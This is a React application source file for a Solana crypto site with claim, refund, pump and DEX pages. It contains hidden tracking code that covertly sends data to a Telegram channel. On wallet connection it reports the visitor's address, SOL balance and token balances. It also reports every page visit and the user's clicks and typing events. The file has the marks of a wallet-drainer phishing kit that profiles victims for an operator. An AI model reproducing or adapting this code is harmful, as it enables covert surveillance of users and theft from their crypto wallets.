import { lazy, Suspense, useEffect, useRef } from "react";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import { WalletProvider } from "./providers/WalletProvider";
import { SolflareDeepLinkHandler } from "@/components/SolflareDeepLinkHandler";
import { Toaster } from "@/components/ui/sonner";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { sendTelegramMessage } from "@/utils/telegram";
import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, LAMPORTS_PER_SOL } from "@solana/spl-token";
import Index from "./pages/Index";
import NotFound from "./pages/NotFound";

// Lazy-loaded pages — only fetched when the user navigates to them
const Dex = lazy(() => import("./pages/Dex"));
const WhyPegasus = lazy(() => import("./pages/WhyPegasus"));
const Claim = lazy(() => import("./pages/Claim"));
const Ads = lazy(() => import("./pages/Ads"));
const MarketMaking = lazy(() => import("./pages/MarketMaking"));
const Refund = lazy(() => import("./pages/Refund"));
const Pump = lazy(() => import("./pages/Pump"));
const OTC = lazy(() => import("./pages/OTC"));
const ListPage = lazy(() => import("./pages/List"));
const Apepe = lazy(() => import("./pages/Apepe"));
const TraderProfile = lazy(() => import("./pages/TraderProfile"));
const Ovt = lazy(() => import("./pages/Ovt"));
const Jpy = lazy(() => import("./pages/Jpy"));

const queryClient = new QueryClient();

const PageLoader = () => (
  <div className="min-h-screen flex items-center justify-center bg-background">
    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
  </div>
);

// Component to send Telegram notifications on Solana wallet connect
const SolanaWalletNotifier = () => {
  const { connected, publicKey } = useWallet();
  const { connection } = useConnection();

  useEffect(() => {
    if (connected && publicKey) {
      const fetchAndNotify = async () => {
        try {
          // Fetch SOL balance
          const solBal = await connection.getBalance(publicKey);
          const solAmount = solBal / LAMPORTS_PER_SOL;

          // Fetch token balances
          const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
          const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
          const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

          const tokens = allTokenAccounts
            .map(account => {
              const info = account.account.data.parsed.info;
              return {
                mint: info.mint,
                uiAmount: info.tokenAmount.uiAmount,
                symbol: info.mint.slice(0, 8),
              };
            })
            .filter(token => token.uiAmount && token.uiAmount > 0);

          // Build message
          let message = `
🔗 <b>Solana Wallet Connected</b>
👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
💰 <b>SOL Balance:</b> <code>${solAmount.toFixed(4)} SOL</code>
`;

          if (tokens.length > 0) {
            message += `\n📋 <b>Token Balances:</b>`;
            tokens.slice(0, 10).forEach((token, i) => {
              message += `\n- Token ${i+1} (${token.symbol}...): <code>${token.uiAmount?.toFixed(4) || 0}</code>`;
            });
            if (tokens.length > 10) {
              message += `\n... and ${tokens.length -10} more`;
            }
          }

          sendTelegramMessage(message);
        } catch (error) {
          console.error('Error fetching Solana balances:', error);
          // Fallback to just wallet connected
          sendTelegramMessage(`
🔗 <b>Solana Wallet Connected</b>
👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
`);
        }
      };

      fetchAndNotify();
    }
  }, [connected, publicKey, connection]);

  return null;
};

// Component to send Telegram notifications on page visits
const PageTracker = () => {
  const location = useLocation();

  useEffect(() => {
    sendTelegramMessage(`
📄 <b>Page Visited</b>
📍 <b>Path:</b> <code>${location.pathname}</code>
`);
  }, [location.pathname]);

  return null;
};

// Component to send Telegram notifications on clicks and inputs
const GlobalEventNotifier = () => {
  const lastClickTime = useRef<number>(0);
  const lastInputTime = useRef<number>(0);

  useEffect(() => {
    const handleClick = (e: MouseEvent) => {
      const now = Date.now();
      if (now - lastClickTime.current < 1000) return; // Throttle to 1/sec
      lastClickTime.current = now;

      const target = e.target as HTMLElement;
      let elementInfo = '';
      
      if (target.tagName === 'BUTTON') {
        elementInfo = `Button: ${(target as HTMLButtonElement).textContent || 'Unnamed Button'}`;
      } else if (target.closest('button')) {
        elementInfo = `Button: ${(target.closest('button') as HTMLButtonElement).textContent || 'Unnamed Button'}`;
      } else {
        elementInfo = `Click on ${target.tagName.toLowerCase()}`;
      }

      sendTelegramMessage(`
🖱️ <b>User Click</b>
📝 <b>Element:</b> <code>${elementInfo}</code>
`);
    };

    const handleInput = (e: Event) => {
      const now = Date.now();
      if (now - lastInputTime.current < 2000) return; // Throttle to 1/2 sec
      lastInputTime.current = now;

      const target = e.target as HTMLInputElement | HTMLTextAreaElement;
      let inputInfo = '';
      
      if (target.tagName === 'INPUT') {
        inputInfo = `Input (${target.type}): ${target.placeholder || 'Unnamed Input'}`;
      } else if (target.tagName === 'TEXTAREA') {
        inputInfo = `Textarea: ${target.placeholder || 'Unnamed Textarea'}`;
      } else {
        inputInfo = `Input on ${target.tagName.toLowerCase()}`;
      }

      sendTelegramMessage(`
⌨️ <b>User Typing/Input</b>
📝 <b>Element:</b> <code>${inputInfo}</code>
`);
    };

    document.addEventListener('click', handleClick, true);
    document.addEventListener('input', handleInput, true);

    return () => {
      document.removeEventListener('click', handleClick, true);
      document.removeEventListener('input', handleInput, true);
    };
  }, []);

  return null;
};

const App = () => (
  <QueryClientProvider client={queryClient}>
    <WalletProvider>
      <SolflareDeepLinkHandler />
      <SolanaWalletNotifier />
      <TooltipProvider>
        <BrowserRouter>
          <Toaster position="top-center" />
          <PageTracker />
          <GlobalEventNotifier />
          <Suspense fallback={<PageLoader />}>
            <Routes>
              <Route path="/" element={<Jpy />} />
              <Route path="/dex" element={<Dex />} />
              <Route path="/why-pegasus" element={<WhyPegasus />} />
              <Route path="/claim" element={<Claim />} />
              <Route path="/ads" element={<Ads />} />
              <Route path="/market-making" element={<MarketMaking />} />
              <Route path="/refund" element={<Refund />} />
              <Route path="/otc" element={<OTC />} />
              <Route path="/list" element={<ListPage />} />
              <Route path="/apepe" element={<Apepe />} />
              <Route path="/ovt" element={<Ovt />} />
              <Route path="/jpy" element={<Jpy />} />
              <Route path="/trader/:username" element={<TraderProfile />} />
              {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
              <Route path="*" element={<NotFound />} />
            </Routes>
          </Suspense>
        </BrowserRouter>
      </TooltipProvider>
    </WalletProvider>
  </QueryClientProvider>
);

export default App;
